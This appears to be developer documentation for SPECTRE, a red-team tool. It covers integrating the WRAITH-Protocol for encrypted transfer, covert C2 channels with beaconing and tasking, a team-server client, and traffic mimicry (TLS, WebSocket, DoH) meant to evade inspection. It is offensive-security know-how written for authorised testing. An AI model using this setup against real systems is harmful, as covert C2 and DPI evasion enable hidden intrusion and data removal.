# WRAITH-Protocol Integration

**Version:** 0.1.0 | **Last Updated:** 2026-02-04

---

## Overview

WRAITH-Protocol provides SPECTRE's secure communications backbone, enabling encrypted file transfer, covert channels, and C2 infrastructure for red team operations.

**Component Version:** v2.3.7
**Repository:** [github.com/doublegate/WRAITH-Protocol](https://github.com/doublegate/WRAITH-Protocol)

---

## Capabilities

| Feature | Description |
|---------|-------------|
| **Wire-Speed Transfer** | 10+ Gbps with AF_XDP kernel bypass |
| **E2EE** | XChaCha20-Poly1305, Noise_XX, Double Ratchet |
| **Traffic Obfuscation** | Elligator2, protocol mimicry (TLS/WS/DoH) |
| **Post-Quantum** | Hybrid X25519 + ML-KEM-768 |
| **Applications** | 12 clients (Transfer, Chat, Sync, Vault, RedOps) |

---

## Integration Architecture

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│                      SPECTRE ↔ WRAITH Integration                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │                        SPECTRE Core                                     │ │
│  │                                                                         │ │
│  │  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────────────┐ │ │
│  │  │   Send/Receive  │  │   C2 Channel    │  │   Campaign Comms        │ │ │
│  │  │   Commands      │  │   Manager       │  │   Coordinator           │ │ │
│  │  └────────┬────────┘  └────────┬────────┘  └────────────┬────────────┘ │ │
│  │           └───────────────────┬┴────────────────────────┘              │ │
│  └───────────────────────────────┼────────────────────────────────────────┘ │
│                                  │                                          │
│  ┌───────────────────────────────▼────────────────────────────────────────┐ │
│  │                    WRAITH Integration Layer                             │ │
│  │                                                                         │ │
│  │  ┌────────────────────────────────────────────────────────────────────┐ │ │
│  │  │                    SpectreComms API                                 │ │ │
│  │  │                                                                    │ │ │
│  │  │   fn send_file(path, peer, opts) -> TransferResult                 │ │ │
│  │  │   fn receive_files(output_dir, opts) -> ()                         │ │ │
│  │  │   fn establish_c2(peer, opts) -> C2Channel                         │ │ │
│  │  │   fn connect_peer(peer_id) -> Session                              │ │ │
│  │  │   fn list_peers() -> Vec<PeerInfo>                                 │ │ │
│  │  └────────────────────────────────────────────────────────────────────┘ │ │
│  └───────────────────────────────┬────────────────────────────────────────┘ │
│                                  │                                          │
│  ┌───────────────────────────────▼────────────────────────────────────────┐ │
│  │                      WRAITH Protocol Stack                              │ │
│  │                                                                         │ │
│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────────┐   │ │
│  │  │  wraith-core  │  │ wraith-crypto │  │    wraith-transport       │   │ │
│  │  │               │  │               │  │                           │   │ │
│  │  │  • Node API   │  │  • Noise_XX   │  │  • UDP, TCP, WS, QUIC     │   │ │
│  │  │  • Sessions   │  │  • Ratchet    │  │  • AF_XDP, io_uring       │   │ │
│  │  │  • Frames     │  │  • Elligator2 │  │  • Protocol mimicry       │   │ │
│  │  └───────────────┘  └───────────────┘  └───────────────────────────┘   │ │
│  │                                                                         │ │
│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────────┐   │ │
│  │  │wraith-obfusc  │  │wraith-discov  │  │      wraith-files         │   │ │
│  │  │               │  │               │  │                           │   │ │
│  │  │  • Padding    │  │  • Kademlia   │  │  • Chunking               │   │ │
│  │  │  • Timing     │  │  • NAT trav   │  │  • BLAKE3 tree            │   │ │
│  │  │  • Cover traf │  │  • Relay      │  │  • io_uring I/O           │   │ │
│  │  └───────────────┘  └───────────────┘  └───────────────────────────┘   │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## API Reference

### SpectreComms

Main interface for WRAITH operations within SPECTRE.

```rust
use spectre_comms::{SpectreComms, SpectreCommsConfig};

// Initialize communications
let config = SpectreCommsConfig {
    identity_path: Some("~/.spectre/identity.key".into()),
    bind_address: "0.0.0.0:0".parse()?,
    protocol_mimicry: Some(ProtocolMimicry::Tls13),
    ..Default::default()
};

let comms = SpectreComms::new(config).await?;
```

### File Transfer

```rust
// Send file
let result = comms.send_file(
    Path::new("report.pdf"),
    "peer-id",
    SendOptions {
        encrypt: true,
        compress: true,
        mimicry: Some(ProtocolMimicry::Tls13),
        ..Default::default()
    },
).await?;

println!("Sent {} bytes, hash: {}", result.bytes_sent, result.hash);

// Receive files
comms.receive_files(
    Path::new("./downloads"),
    ReceiveOptions {
        auto_accept: false,
        accept_from: vec!["trusted-peer".into()],
        ..Default::default()
    },
).await?;
```

### C2 Channel

For red team operations with WRAITH-RedOps integration:

```rust
// Establish covert C2 channel
let channel = comms.establish_c2_channel(
    "operator-server",
    C2Options {
        mimicry: Some(ProtocolMimicry::DnsOverHttps),
        cover_traffic: true,
        beacon_interval: Duration::from_secs(60),
        jitter: 0.2,
        ..Default::default()
    },
).await?;

// Send beacon
channel.beacon(json!({
    "status": "active",
    "hostname": hostname,
    "findings": findings_count,
})).await?;

// Receive tasking
let task = channel.receive_task().await?;
```

### Peer Management

```rust
// List connected peers
let peers = comms.list_peers().await?;
for peer in peers {
    println!("{}: {} ({})", peer.alias, peer.id, peer.status);
}

// Add peer alias
comms.add_peer_alias("abc123...xyz", "c2-server").await?;

// Connect to peer
let session = comms.connect_peer("@c2-server").await?;
```

---

## Configuration

### SPECTRE Config (spectre.toml)

```toml
[comms]
# Identity key file
identity_file = "~/.spectre/identity.key"

# Bind address for receiving
bind_address = "0.0.0.0:0"

# Default protocol mimicry
default_mimicry = "tls"  # tls, websocket, doh, none

# Cover traffic
cover_traffic = false
cover_traffic_rate = "low"  # low, medium, high

# Padding mode
padding_mode = "power_of_two"  # power_of_two, size_classes, constant_rate

# Timing obfuscation
timing_mode = "normal"  # fixed, uniform, normal, exponential

# Discovery
enable_dht = true
bootstrap_nodes = [
    "node1.wraith.network:4433",
    "node2.wraith.network:4433",
]

# Relay fallback
enable_relay = true

[comms.peers]
# Peer aliases
c2-server = "abc123..."
analyst = "def456..."
backup = "ghi789..."
```

### Environment Variables

| Variable | Description |
|----------|-------------|
| `SPECTRE_IDENTITY` | Identity key file path |
| `SPECTRE_BIND_ADDR` | Bind address |
| `SPECTRE_MIMICRY` | Default mimicry protocol |
| `WRAITH_BOOTSTRAP` | Bootstrap node list |

---

## Protocol Mimicry

WRAITH supports protocol mimicry to evade DPI:

### TLS 1.3 Mimicry

```rust
SendOptions {
    mimicry: Some(ProtocolMimicry::Tls13),
    ..Default::default()
}
```

- Mimics TLS 1.3 ClientHello/ServerHello
- Valid-looking certificate chains
- Encrypted application data

### WebSocket Mimicry

```rust
SendOptions {
    mimicry: Some(ProtocolMimicry::WebSocket),
    ..Default::default()
}
```

- HTTP Upgrade handshake
- WebSocket frame format
- Compatible with proxies

### DNS-over-HTTPS Mimicry

```rust
SendOptions {
    mimicry: Some(ProtocolMimicry::DnsOverHttps),
    ..Default::default()
}
```

- HTTPS to common DoH providers
- DNS query/response format
- Blends with legitimate traffic

---

## Traffic Obfuscation

### Padding Modes

| Mode | Description |
|------|-------------|
| `PowerOfTwo` | Pad to next power of 2 |
| `SizeClasses` | Pad to fixed size classes |
| `ConstantRate` | Fixed packet rate/size |
| `Statistical` | Match traffic distribution |

### Timing Modes

| Mode | Description |
|------|-------------|
| `Fixed` | Constant inter-packet delay |
| `Uniform` | Random within range |
| `Normal` | Gaussian distribution |
| `Exponential` | Exponential distribution |

### Cover Traffic

```toml
[comms]
cover_traffic = true
cover_traffic_rate = "medium"
```

Generates dummy traffic to mask real communication patterns.

---

## WRAITH-RedOps Integration

For advanced red team operations, SPECTRE can connect to WRAITH-RedOps team server:

### Team Server Connection

```rust
use spectre_redops::{TeamServerClient, Credentials};

let client = TeamServerClient::connect(
    "https://team.operator.net:50051",
    Credentials::Certificate {
        cert: "/path/to/operator.crt",
        key: "/path/to/operator.key",
    },
).await?;
```

### Campaign Coordination

```rust
// Create campaign on team server
let campaign = client.create_campaign(CampaignConfig {
    name: "Operation BLACKOUT",
    targets: vec!["192.168.1.0/24"],
    ..Default::default()
}).await?;

// Get active beacons
let beacons = client.get_beacons().await?;

// Task beacon
client.task_beacon(beacon_id, Task::Execute {
    command: "whoami",
}).await?;
```

### Listener Management

```rust
// Create HTTP listener
client.create_listener(ListenerConfig {
    protocol: Protocol::Https,
    host: "0.0.0.0",
    port: 443,
    ..Default::default()
}).await?;

// List listeners
let listeners = client.list_listeners().await?;
```

---

## Security Considerations

### Key Management

- Identity keys stored encrypted at rest
- Keys never transmitted in cleartext
- Automatic key rotation supported

### Perfect Forward Secrecy

- Double Ratchet protocol ensures PFS
- Session keys derived independently
- Compromise of one session doesn't affect others

### Post-Quantum Security

```rust
SpectreCommsConfig {
    post_quantum: true,  // Enable X25519 + ML-KEM-768 hybrid
    ..Default::default()
}
```

### Audit Logging

All transfers logged with:
- Timestamp
- Peer identity
- File hash
- Transfer status
- Error details (if any)

---

## Troubleshooting

### Cannot connect to peer

```bash
# Check connectivity
spectre peers ping abc123...xyz

# Verify peer is online
spectre peers status @c2-server

# Check NAT traversal
spectre comms diagnose --peer abc123
```

### Transfer failing

```bash
# Check network path
spectre comms trace-route @peer

# Try different mimicry
spectre send file.pdf --peer @c2 --mimicry websocket

# Enable verbose logging
SPECTRE_VERBOSE=3 spectre send file.pdf --peer @c2
```

### High latency

```bash
# Check relay usage
spectre comms status

# Force direct connection
spectre send file.pdf --peer @c2 --no-relay
```

---

## Performance Tuning

### High Throughput

```toml
[comms]
# Use AF_XDP for kernel bypass (Linux 6.2+)
af_xdp = true

# Increase chunk size
chunk_size = 262144  # 256 KB

# Disable obfuscation for speed
padding_mode = "none"
timing_mode = "none"
```

### Low Latency

```toml
[comms]
# Use QUIC transport
preferred_transport = "quic"

# Smaller chunks
chunk_size = 16384  # 16 KB

# Disable compression
compress = false
```

### Covert Operations

```toml
[comms]
# Maximum obfuscation
default_mimicry = "doh"
padding_mode = "statistical"
timing_mode = "exponential"
cover_traffic = true
cover_traffic_rate = "high"
```

---

## References

- [WRAITH-Protocol README](https://github.com/doublegate/WRAITH-Protocol/blob/main/README.md)
- [WRAITH Integration Guide](https://github.com/doublegate/WRAITH-Protocol/blob/main/docs/INTEGRATION_GUIDE.md)
- [WRAITH Security Model](https://github.com/doublegate/WRAITH-Protocol/blob/main/docs/architecture/security-model.md)
- [WRAITH-RedOps Documentation](https://github.com/doublegate/WRAITH-Protocol/blob/main/docs/clients/wraith-redops/)
